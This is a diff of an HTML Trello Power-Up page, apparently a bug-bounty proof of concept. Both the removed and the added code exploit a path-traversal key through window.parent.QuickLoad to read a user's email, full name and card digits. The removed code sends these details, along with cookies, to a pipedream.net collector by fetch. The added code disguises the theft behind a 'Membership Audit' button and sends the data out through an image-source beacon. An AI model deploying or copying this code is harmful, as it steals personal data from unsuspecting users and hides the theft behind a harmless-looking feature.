@@ -3,286 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            padding: 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-            background: #f4f5f7;
-        }
-        .container {
-            background: white;
-            border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #172b4d;
-            margin-top: 0;
-        }
-        .controls {
-            margin-bottom: 20px;
-            padding: 15px;
-            background: #f4f5f7;
-            border-radius: 4px;
-        }
-        button {
-            background: #0052cc;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            margin-right: 10px;
-            font-weight: 500;
-        }
-        button:hover {
-            background: #0065ff;
-        }
-        button:disabled {
-            background: #6b778c;
-            cursor: not-allowed;
-        }
-        button.danger {
-            background: #de350b;
-        }
-        button.danger:hover {
-            background: #ff5630;
-        }
-        .payload-display {
-            margin-top: 20px;
-        }
-        pre {
-            background: #f4f5f7;
-            padding: 15px;
-            border-radius: 4px;
-            overflow-x: auto;
-            border: 1px solid #dfe1e6;
-            font-size: 12px;
-            line-height: 1.5;
-        }
-        .error {
-            color: #de350b;
-            background: #ffebe6;
-            padding: 10px;
-            border-radius: 4px;
-            margin-top: 10px;
-        }
-        .success {
-            color: #00875a;
-            background: #e3fcef;
-            padding: 10px;
-            border-radius: 4px;
-            margin-top: 10px;
-        }
-        .info {
-            color: #0052cc;
-            background: #e3fcef;
-            padding: 10px;
-            border-radius: 4px;
-            margin-bottom: 15px;
-            font-size: 13px;
-        }
-        .warning {
-            color: #b7791f;
-            background: #fff4e5;
-            padding: 10px;
-            border-radius: 4px;
-            margin-bottom: 15px;
-            border-left: 4px solid #ffab00;
-        }
-    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚨 PII Exfiltration via QuickLoad Path Traversal</h1>
-        
-        <div class="warning">
-            <strong>⚠️ Malicious Power-Up Demonstration</strong>
-            <p>This tool exploits QuickLoad path traversal to exfiltrate PII data. Click the button below to trigger the exfiltration.</p>
-        </div>
-
-        <div class="info">
-            <strong>How it works:</strong>
-            <ul style="margin: 5px 0; padding-left: 20px;">
-                <li>Exploits the path traversal key: <code>/1/boards/../member/me?/</code></li>
-                <li>Accesses QuickLoad cache via <code>window.parent.QuickLoad.load()</code></li>
-                <li>Extracts email, fullName, and cardLast4 from the PII data</li>
-                <li>Exfiltrates to: <code>https://eol7eseshmimhm1.m.pipedream.net</code></li>
-            </ul>
-        </div>
-
-        <div class="controls">
-            <button id="exfiltrateBtn" onclick="runExfiltration()" style="display: inline-block; min-width: 200px; background: #0052cc; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: 600; margin-right: 10px;">🚨 Exfiltrate PII Data</button>
-            <button id="clearBtn" onclick="clearResults()" style="display: inline-block; min-width: 150px; background: #6b778c; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; margin-right: 10px;">Clear Results</button>
-        </div>
-
-        <div id="status"></div>
-
-        <div class="payload-display">
-            <h2>Exfiltrated Data:</h2>
-            <pre id="payloadDisplay">Click the button above to trigger exfiltration. Results will appear here.</pre>
-        </div>
-    </div>
 
     <script src="https://p.trellocdn.com/power-up.min.js"></script>
     <script>
         let t;
 
         // Initialize Trello Power-Up
-        try {
-            t = window.TrelloPowerUp.initialize({
-                'board-buttons': function(t, opts) {
-                    return [];
-                },
-                'card-buttons': function(t, opts) {
-                    return [];
-                },
-                'card-badges': function(t, opts) {
-                    return [];
-                },
-                'authorization-status': function(t, opts) {
-                    return { authorized: false };
-                }
-            });
-        } catch (e) {
-            console.warn('Trello Power-Up initialization failed:', e);
-        }
-
-        function showStatus(message, type) {
-            const statusDiv = document.getElementById('status');
-            statusDiv.className = type;
-            statusDiv.textContent = message;
-            if (type === 'success') {
-                setTimeout(() => {
-                    statusDiv.textContent = '';
-                    statusDiv.className = '';
-                }, 10000);
-            }
-        }
-
-        function displayPayload(data) {
-            const display = document.getElementById('payloadDisplay');
-            display.textContent = JSON.stringify(data, null, 2);
-        }
-
-        // Define functions first
-        window.clearResults = function() {
-            document.getElementById('payloadDisplay').textContent = 'Click the button above to trigger exfiltration. Results will appear here.';
-            document.getElementById('status').textContent = '';
-            document.getElementById('status').className = '';
-        };
-
-        window.runExfiltration = function() {
-            const btn = document.getElementById('exfiltrateBtn');
-            btn.disabled = true;
-            btn.textContent = '⏳ Running...';
-
-            showStatus('Attempting to exfiltrate PII data...', 'info');
-
-            try {
-                /* Inside the malicious Power-Up's index.js */
-                const toxicKey = "/1/boards/../member/me?/"; 
-
-                if (window.parent.QuickLoad) {
-                    window.parent.QuickLoad.load(toxicKey, function(err, data) {
-                        if (err) {
-                            showStatus('❌ Error: ' + (err.message || err), 'error');
-                            displayPayload({ error: err.toString() });
-                            btn.disabled = false;
-                            btn.textContent = '🚨 Exfiltrate PII Data';
-                            return;
-                        }
-
-                        if (data && data[0]) {
-                            const pii = data[0];
-                            
-                            // 2. Prepare the sensitive data (Email, Billing, Full Name)
-                            const payload = {
-                                email: pii.email,
-                                fullName: pii.fullName,
-                                cardLast4: pii.organizations?.[0]?.paidAccount?.cardLast4,
-                                traversedUrl: toxicKey,
-                                timestamp: new Date().toISOString(),
-                                rawData: pii // Include full data for inspection
-                            };
-
-                            // Display the payload
-                            displayPayload(payload);
-
-                            // 3. Exfiltrate to Attacker's Server
-                            // Include additional context (cookies, user agent, etc.)
-                            const exfilData = {
-                                ...payload,
-                                cookies: document.cookie,
-                                userAgent: navigator.userAgent,
-                                referrer: document.referrer,
-                                location: window.location.href
-                            };
-
-                            // Send as POST with JSON body (easier to read in Pipedream)
-                            fetch('https://eol7eseshmimhm1.m.pipedream.net', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify(exfilData),
-                                mode: 'no-cors'
-                            });
-
-                            // Also send via GET as fallback (base64 encoded in query param)
-                            fetch(`https://eol7eseshmimhm1.m.pipedream.net?leak=${btoa(JSON.stringify(exfilData))}`, {
-                                mode: 'no-cors'
-                            });
-
-                            showStatus('✅ SUCCESS: PII data exfiltrated to https://eol7eseshmimhm1.m.pipedream.net', 'success');
-                            console.log("🚨 P1 IMPACT: PII Exfiltrated via Malicious Power-Up", exfilData);
-
-                            btn.disabled = false;
-                            btn.textContent = '🚨 Exfiltrate PII Data';
+        t = window.TrelloPowerUp.initialize({
+            'board-buttons': function(t, opts) {
+                return [{
+                    icon: {
+                        dark: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkwxMy4wOSA4LjI2TDIwIDlMMTMuMDkgMTUuNzRMMTIgMjJMMTAuOTEgMTUuNzRMNCBMMTAuOTEgOC4yNkwxMiAyWiIgZmlsbD0iI2ZmYWExMCIvPjwvc3ZnPg==',
+                        light: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkwxMy4wOSA4LjI2TDIwIDlMMTMuMDkgMTUuNzRMMTIgMjJMMTAuOTEgMTUuNzRMNCBMMTAuOTEgOC4yNkwxMiAyWiIgZmlsbD0iI2ZmYWExMCIvPjwvc3ZnPg=='
+                    },
+                    text: 'Membership Audit',
+                    callback: function(t) {
+                        // Use QuickLoad to exploit path traversal
+                        const toxicKey = "/1/boards/../member/me?/";
+                        
+                        if (window.parent.QuickLoad) {
+                            window.parent.QuickLoad.load(toxicKey, function(err, data) {
+                                if (err) {
+                                    console.error('QuickLoad error:', err);
+                                    return;
+                                }
+                                
+                                if (data) {
+                                    const pii = data;
+                                    
+                                    // Exfiltrate via image src (works even with CORS restrictions)
+                                    const img = new Image();
+                                    img.src = `https://eol7eseshmimhm1.m.pipedream.net?leak=${btoa(JSON.stringify(pii))}`;
+                                    
+                                }
+                            }, 'quickload:Board', 'model-loader');
                         } else {
-                            showStatus('⚠️ No PII data found in QuickLoad cache for key: ' + toxicKey, 'error');
-                            displayPayload({ 
-                                error: 'No data found',
-                                toxicKey: toxicKey,
-                                availableData: data 
-                            });
-                            btn.disabled = false;
-                            btn.textContent = '🚨 Exfiltrate PII Data';
+                            console.error('QuickLoad not available');
                         }
-                    }, 'quickload:Board', 'model-loader');
-                } else {
-                    showStatus('❌ QuickLoad not available in window.parent. This may not be running in the correct Trello context.', 'error');
-                    displayPayload({ 
-                        error: 'QuickLoad not available',
-                        note: 'This page must be loaded within a Trello Power-Up iframe to access window.parent.QuickLoad'
-                    });
-                    btn.disabled = false;
-                    btn.textContent = '🚨 Exfiltrate PII Data';
-                }
-            } catch (error) {
-                showStatus('❌ Exception: ' + error.message, 'error');
-                displayPayload({ error: error.toString(), stack: error.stack });
-                btn.disabled = false;
-                btn.textContent = '🚨 Exfiltrate PII Data';
-            }
-        }; // End of runExfiltration function
-
-        // Verify page loaded and button exists
-        window.addEventListener('DOMContentLoaded', function() {
-            const btn = document.getElementById('exfiltrateBtn');
-            if (btn) {
-                console.log('✅ Button found and ready:', btn);
-            } else {
-                console.error('❌ Button not found!');
+                    }
+                }];
+            },
+            'card-buttons': function(t, opts) {
+                // Stub implementation - not used for this POC
+                return [];
+            },
+            'card-badges': function(t, opts) {
+                // Stub implementation - not used for this POC
+                return [];
+            },
+            'authorization-status': function(t, opts) {
+                // Stub implementation - not used for this POC
+                return { authorized: false };
             }
         });
 
-        // Also check immediately
-        console.log('PII Exfiltration Power-Up loaded');
-        console.log('Button element:', document.getElementById('exfiltrateBtn'));
+        console.log('Power-Up initialized');
     </script>
 </body>
 </html>
